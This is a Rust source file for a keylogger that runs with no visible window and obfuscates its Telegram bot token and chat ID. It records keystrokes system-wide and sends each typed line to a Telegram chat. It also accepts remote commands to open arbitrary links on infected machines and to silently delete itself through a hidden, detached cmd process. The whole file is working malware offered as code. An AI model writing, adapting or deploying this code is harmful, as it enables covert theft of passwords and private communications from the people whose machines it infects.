#![windows_subsystem = "windows"]

use gethostname::gethostname;
use rdev::{listen, EventType, Key};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use teloxide::{prelude::*, utils::command::BotCommands};
use tokio::sync::mpsc;

use obfstr::obfstr as s;

#[derive(BotCommands, Clone)]
#[command(
    rename_rule = "lowercase",
    description = "These commands are supported:"
)]
enum Command {
    #[command(description = "remove the executable from the system with the given hostname")]
    Remove(String),
    #[command(
        description = "open a link on the machine with the specified hostname",
        parse_with = "split"
    )]
    OpenLink { hostname: String, link: String },
    #[command(description = "show this text")]
    Help,
}

async fn answer(bot: Bot, msg: Message, cmd: Command) -> ResponseResult<()> {
    if msg.chat.id.to_string() != s!(env!("CHAT_ID")) {
        bot.send_message(msg.chat.id, "You are not authorized to use this bot")
            .await?;
    }

    match cmd {
        Command::Remove(hostname) => {
            if hostname == "*" || hostname == gethostname().to_string_lossy() {
                bot.send_message(msg.chat.id, "Removing executable from system")
                    .await?;
                #[cfg(target_os = "windows")]
                {
                    use std::os::windows::process::CommandExt;

                    std::process::Command::new("cmd")
                        .args(&[
                            "/C",
                            "timeout",
                            "/T",
                            "1",
                            "&",
                            "del",
                            "/F",
                            "/Q",
                            std::env::current_exe().unwrap().to_str().unwrap(),
                        ])
                        // CREATE_NO_WINDOW and DETACHED_PROCESS
                        .creation_flags(0x8000008)
                        .spawn()
                        .unwrap();
                }
                #[cfg(not(target_os = "windows"))]
                {
                    std::fs::remove_file(std::env::current_exe().unwrap()).unwrap();
                }
                std::process::exit(0);
            }
        }
        Command::OpenLink { hostname, link } => {
            if hostname == "*" || hostname == gethostname().to_string_lossy() {
                match webbrowser::open(&link) {
                    Ok(_) => {
                        bot.send_message(
                            msg.chat.id,
                            format!(
                                "Opened link {} on {}",
                                link,
                                gethostname().to_string_lossy()
                            ),
                        )
                        .await?;
                    }
                    Err(_) => {
                        bot.send_message(
                            msg.chat.id,
                            format!(
                                "Failed to open link {} on {}",
                                link,
                                gethostname().to_string_lossy()
                            ),
                        )
                        .await?;
                    }
                }
            }
        }
        Command::Help => {
            bot.send_message(msg.chat.id, Command::descriptions().to_string())
                .await?;
        }
    }
    Ok(())
}

#[tokio::main]
async fn main() {
    let bot = Bot::new(s!(env!("BOT_TOKEN")));

    let command_task = Command::repl(bot.clone(), answer);

    let (tx, mut rx) = mpsc::unbounded_channel::<String>();

    let bot_task = tokio::spawn(async move {
        while let Some(message) = rx.recv().await {
            loop {
                match bot
                    .send_message(s!(env!("CHAT_ID")).to_string(), message.clone())
                    .await
                {
                    Ok(_) => break,
                    Err(err) => {
                        eprintln!("Failed to send message with error: {:?}", err);
                        tokio::time::sleep(Duration::from_secs(5)).await; // Retry after 5 seconds if failed
                    }
                }
            }
        }
    });

    let task = {
        tokio::task::spawn_blocking(move || {
            let key_buffer = Arc::new(Mutex::new(String::new()));

            listen(move |event| {
                let tx = tx.clone();
                let key_buffer_value = key_buffer.clone();

                tokio::spawn(async move {
                    handle_key(event.event_type, tx, key_buffer_value).await;
                });
            })
            .expect("Failed while listening to keyboard events");
        })
    };

    tokio::select! {
        _ = bot_task => {}
        _ = task => {}
        _ = command_task => {}
    }
}

async fn handle_key(
    event: EventType,
    tx: mpsc::UnboundedSender<String>,
    key_buffer: Arc<Mutex<String>>,
) {
    let key: Key = match event {
        EventType::KeyPress(key) => key,
        _ => return,
    };

    let mut key_buffer = key_buffer.lock().unwrap();

    if key == Key::Return {
        tx.send(key_buffer.clone()).unwrap();
        key_buffer.clear();
    } else {
        key_buffer.push_str(fmt_key(key).as_str());
    }
}

fn fmt_key(key: Key) -> String {
    let key_str = format!("{:?} ", key);

    if key_str.starts_with("Key") {
        key_str[3..].to_string()
    } else {
        key_str
    }
}
